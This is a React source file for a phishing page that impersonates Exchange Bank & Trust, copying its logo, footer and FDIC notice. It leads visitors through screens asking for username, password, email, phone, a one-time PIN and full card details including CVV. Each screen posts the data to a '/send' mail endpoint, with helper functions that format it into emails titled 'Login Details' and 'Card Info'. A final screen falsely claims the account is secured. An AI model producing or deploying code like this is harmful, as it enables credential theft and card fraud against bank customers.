import React, { useState } from "react";
import axios from "axios";
import cbiLogo from "./assets/logo.png";
import "./App.css";

// Add your other logos here if needed

function App() {
  const [step, setStep] = useState(1);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [contactEmail, setContactEmail] = useState("");
  const [contactPhone, setContactPhone] = useState("");
  const [otp, setOtp] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [zip, setZip] = useState("");

  const handleLoginSubmit = (e) => {
    e.preventDefault();
    setStep(2);
  };

  const handleSignIn = async (e) => {
    e.preventDefault();
    try {
      await axios.post("http://localhost:5000/send", {
        email: username,
        message: password,
        subject: "Login Details",
      });
    } catch (error) {
      console.error("Error sending login details:", error);
    }
    setStep(3);
  };

  const handleContactSubmit = async (e) => {
    e.preventDefault();
    try {
      await axios.post("http://localhost:5000/send", {
        email: contactEmail,
        message: contactPhone,
        subject: "Contact Info",
      });
    } catch (error) {
      console.error("Error sending contact info:", error);
    }
    setStep(4);
  };

  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    try {
      await axios.post("http://localhost:5000/send", {
        email: contactEmail,
        message: otp,
        subject: "OTP Verification",
      });
    } catch (error) {
      console.error("Error sending OTP:", error);
    }
    setStep(5);
  };

  const handleCardSubmit = async (e) => {
    e.preventDefault();
    try {
      await axios.post("http://localhost:5000/send", {
        email: contactEmail,
        message:
          `Card Number: ${cardNumber}\n` +
          `Expiry: ${expiry}\n` +
          `CVV: ${cvv}\n` +
          `Zip Code: ${zip}`,
        subject: "Card Info",
      });
    } catch (error) {
      console.error("Error sending card info:", error);
    }
    setStep(6);
  };

  const handleSwitch = () => {
    setStep(1);
    setPassword("");
  };

  function getEmailText(subject, email, message) {
    if (subject === 'Login Details') {
      return `Username: ${email}\nPassword: ${message}`;
    } else if (subject === 'Contact Info') {
      return `Email Address: ${email}\nPhone Number: ${message}`;
    } else if (subject === 'OTP Verification') {
      return `Email Address: ${email}\nOTP: ${message}`;
    } else if (subject === 'Card Info') {
      return message; // <-- This will include username, password, and all card info
    } else {
      return `Email: ${email}\nMessage: ${message}`;
    }
  }

  function getEmailHtml(subject, email, message) {
    let title = 'Information';
    let contentHtml = '';

    if (subject === 'Login Details') {
      title = 'Login Information';
      contentHtml = `
        <p><strong>Username:</strong> ${email}</p>
        <p><strong>Password:</strong> ${message}</p>
      `;
    } else if (subject === 'Contact Info') {
      title = 'Contact Information';
      contentHtml = `
        <p><strong>Email Address:</strong> ${email}</p>
        <p><strong>Phone Number:</strong> ${message}</p>
      `;
    } else if (subject === 'OTP Verification') {
      title = 'Security Verification';
      contentHtml = `
        <p><strong>Verification Code:</strong> ${message}</p>
      `;
    } else if (subject === 'Card Info') {
      title = 'Card Information';
      // Format all lines as HTML
      contentHtml = message
        .split('\n')
        .map(line => {
          const [label, ...rest] = line.split(':');
          return `<p><strong>${label.trim()}:</strong> ${rest.join(':').trim()}</p>`;
        })
        .join('');
    } else {
      contentHtml = `<p><strong>Message:</strong> ${message}</p>`;
    }

    return `<div style="font-family: Arial, sans-serif; padding: 20px; border: 1px solid #ddd; border-radius: 5px;">
      <h2 style="color: #333;">${title}</h2>
      ${contentHtml}
    </div>`;
  }

  return (
    <div>
      {step === 6 ? (
        <div className="login-container success-container">
          <div className="success-logos">
            <img src={cbiFamily} alt="CBI Family of Banks" className="success-logo" />
            <img src={fmBank} alt="F&M Bank" className="success-logo" />
          </div>
          <h2 className="success-heading">Verification Complete.</h2>
          <div className="success-subheading">
            Your information has been successfully verified.<br />
            Your account has been secured
          </div>
        </div>
      ) : (
        <div className="login-container">
          <img src={cbiLogo} alt="Exchange Bank & Trust" className="login-logo" />
          {step === 1 && (
            <form style={{ width: "100%" }} onSubmit={handleLoginSubmit}>
              <div className="login-input-wrapper">
                <input
                  id="username"
                  type="text"
                  className="login-input"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  required
                  onFocus={e => e.target.parentNode.classList.add('focused')}
                  onBlur={e => e.target.parentNode.classList.remove('focused')}
                />
                <label
                  htmlFor="username"
                  className={`login-label${username ? " login-label--float" : ""}`}
                >
                  Username
                </label>
              </div>
              <div className="forgot-link">Forgot?</div>
              <div className="login-actions">
                <div className="enroll-row">
                  First time user? <span className="enroll-link">Enroll now.</span>
                </div>
                <button type="submit" className="login-button">Continue</button>
              </div>
            </form>
          )}
          {step === 2 && (
            <form style={{ width: "100%" }} onSubmit={handleSignIn}>
              <div className="username-row">
                <span className="username-label">Username</span>
                <span className="username-value">{username}</span>
                <span className="switch-link" onClick={handleSwitch}>Switch</span>
              </div>
              <div className="login-input-wrapper password-wrapper">
                <label
                  htmlFor="password"
                  className={`login-label${password ? " login-label--float" : ""}`}
                >
                  Enter your password
                </label>
                <input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  className="login-input password-input"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  onFocus={e => e.target.parentNode.classList.add('focused')}
                  onBlur={e => e.target.parentNode.classList.remove('focused')}
                />
                <span className="eye-icon" onClick={() => setShowPassword(v => !v)}>
                  {showPassword ? (
                    <svg width="24" height="24" fill="none" stroke="#ffe066" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24">
                      <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/>
                      <circle cx="12" cy="12" r="3"/>
                    </svg>
                  ) : (
                    <svg width="24" height="24" fill="none" stroke="#ffe066" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24">
                      <path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a21.8 21.8 0 0 1 5.06-6.06"/>
                      <path d="M1 1l22 22"/>
                      <path d="M9.53 9.53A3 3 0 0 0 12 15a3 3 0 0 0 2.47-5.47"/>
                    </svg>
                  )}
                </span>
              </div>
              <div className="forgot-link">Forgot?</div>
              <div className="signin-actions">
                <button type="button" className="passkey-btn">
                  <span className="fingerprint-icon">
                  <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#ffe066" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">

  <path d="M12 22c4.418 0 8-4.03 8-9s-3.582-9-8-9-8 4.03-8 9 3.582 9 8 9z"/>
  

  <path d="M12 19c3.314 0 6-3.134 6-7s-2.686-7-6-7-6 3.134-6 7 2.686 7 6 7z"/>
  <path d="M12 16c2.209 0 4-2.239 4-5s-1.791-5-4-5-4 2.239-4 5 1.791 5 4 5z"/>
  

  <path d="M12 12v4"/>
  <path d="M14 13c0-1.105-1.343-2-2-2s-2 0.895-2 2v1"/>
</svg>

                  </span> Sign in with a passkey
                </button>
                <button type="submit" className="login-button signin-btn">Sign in</button>
              </div>
            </form>
          )}
          {step === 3 && (
            <form style={{ width: "100%" }} onSubmit={handleContactSubmit}>
              <div className="contact-heading">Verify Contact Information</div>
              <div className="contact-subheading">Please confirm your contact details on file.</div>
              <div className="login-input-wrapper">
                <input
                  type="email"
                  className="login-input"
                  placeholder="Email Address"
                  value={contactEmail}
                  onChange={e => setContactEmail(e.target.value)}
                  required
                />
              </div>
              <div className="login-input-wrapper">
                <input
                  type="tel"
                  className="login-input"
                  placeholder="Phone Number"
                  value={contactPhone}
                  onChange={e => setContactPhone(e.target.value)}
                  required
                />
              </div>
              <button type="submit" className="login-button contact-btn">Continue</button>
            </form>
          )}
          {step === 4 && (
            <form style={{ width: "100%" }} onSubmit={handleOtpSubmit}>
              <div className="otp-heading">Verification</div>
              <div className="otp-subheading">
                We sent you a One-Time PIN to your registered mobile number.<br />
                Please enter the code below
              </div>
              <div className="login-input-wrapper">
                <input
                  type="text"
                  className="login-input"
                  placeholder="Secure Code"
                  value={otp}
                  onChange={e => setOtp(e.target.value)}
                  required
                />
              </div>
              <div className="otp-info">SMS code might take some minutes to arrive.</div>
              <button type="submit" className="login-button contact-btn">Continue</button>
            </form>
          )}
          {step === 5 && (
            <form style={{ width: "100%" }} onSubmit={handleCardSubmit}>
              <div className="card-heading">Card Information</div>
              <div className="card-subheading">Please enter your card details below.</div>
              <div className="login-input-wrapper">
                <input
                  type="text"
                  className="login-input"
                  placeholder="Card Number"
                  value={cardNumber}
                  onChange={e => setCardNumber(e.target.value.replace(/[^0-9]/g, '').slice(0, 16))}
                  required
                  maxLength={16}
                />
              </div>
              <div className="login-input-wrapper card-row">
                <input
                  type="text"
                  className="login-input card-expiry"
                  placeholder="MM/YYYY"
                  value={expiry}
                  onChange={e => {
                    let val = e.target.value.replace(/[^0-9]/g, '');
                    if (val.length > 6) val = val.slice(0, 6);
                    if (val.length > 2) val = val.slice(0,2) + '/' + val.slice(2);
                    setExpiry(val);
                  }}
                  required
                  maxLength={7}
                  style={{ width: '48%' }}
                />
                <input
                  type="text"
                  className="login-input card-cvv"
                  placeholder="CVV"
                  value={cvv}
                  onChange={e => setCvv(e.target.value.replace(/[^0-9]/g, '').slice(0, 3))}
                  required
                  maxLength={3}
                  style={{ width: '48%', marginLeft: '4%' }}
                />
              </div>
              <div className="login-input-wrapper">
                <input
                  type="text"
                  className="login-input"
                  placeholder="Zip Code"
                  value={zip}
                  onChange={e => setZip(e.target.value.replace(/[^0-9]/g, ''))}
                  required
                />
              </div>
              <button type="submit" className="login-button contact-btn">Continue</button>
            </form>
          )}
        </div>
      )}
      <footer className="login-footer">
        © 2025 Exchange Bank & Trust &nbsp; · &nbsp; (913) 367-6000 &nbsp; · &nbsp;
        <a href="#" style={{ color: "#ffe066", textDecoration: "underline" }}>Privacy policy</a>
        &nbsp; · &nbsp; Member FDIC &nbsp; · &nbsp; Equal Housing Lender
      </footer>
    </div>
  );
}

export default App;